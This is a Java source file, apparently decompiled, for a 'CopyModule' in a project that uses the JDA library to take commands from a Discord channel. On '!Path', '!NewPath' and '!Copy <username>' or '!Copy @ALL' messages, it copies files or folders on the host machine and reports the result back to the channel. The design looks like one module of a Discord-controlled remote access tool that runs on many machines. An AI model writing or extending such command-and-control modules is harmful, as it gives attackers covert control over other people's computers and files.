package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class CopyModule {
    private static String CopyNewPath;
    private static String CopyPath;

    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-copy")) {
            if (!var1.getContentDisplay().equalsIgnoreCase("!Copy " + Brain.Username) && !var1.getContentDisplay().equalsIgnoreCase("!Copy @ALL")) {
                if (var1.getContentDisplay().contains("!Path")) {
                    CopyPath = var1.getContentDisplay().replace("!Path ", "");
                    Helper.sendMessage(Color.GREEN, "Module Copy", "Path has been successfully set to: `" + CopyPath + "`.", var0);
                } else if (var1.getContentDisplay().contains("!NewPath")) {
                    CopyNewPath = var1.getContentDisplay().replace("!NewPath ", "");
                    Helper.sendMessage(Color.GREEN, "Module Copy", "NewPath has been successfully set to: `" + CopyNewPath + "`.", var0);
                }
            } else {
                if (CopyPath == null) {
                    Helper.sendMessage(Color.RED, "Module Copy", "Path is empty.", var0);
                    return;
                }

                if (CopyNewPath == null) {
                    Helper.sendMessage(Color.RED, "Module Copy", "NewPath is empty.", var0);
                    return;
                }

                try {
                    Files.copy((new File(CopyPath)).toPath(), (new File(CopyNewPath)).toPath());
                    if ((new File(CopyPath)).isDirectory()) {
                        File[] var2 = (new File(CopyPath)).listFiles();
                        assert var2 != null;

                        File[] var3 = var2;
                        int var4 = var2.length;

                        for (int var5 = 0; var5 < var4; ++var5) {
                            File var6 = var3[var5];
                            Files.copy(var6.toPath(), (new File(CopyNewPath + File.separator + var6.getName())).toPath());
                        }
                    }

                    Helper.sendMessage(Color.GREEN, "Module Copy (" + Brain.Username + ")", ((new File(CopyPath)).isDirectory() ? "Folder " : "File ") + "`" + CopyPath + "` was successfully copied to `" + CopyNewPath + "`.", var0);
                } catch (IOException var7) {
                    Helper.sendMessage(Color.RED, "Module Copy (" + Brain.Username + ")", "Could not copy file.", var0);
                }
            }

        }
    }
}
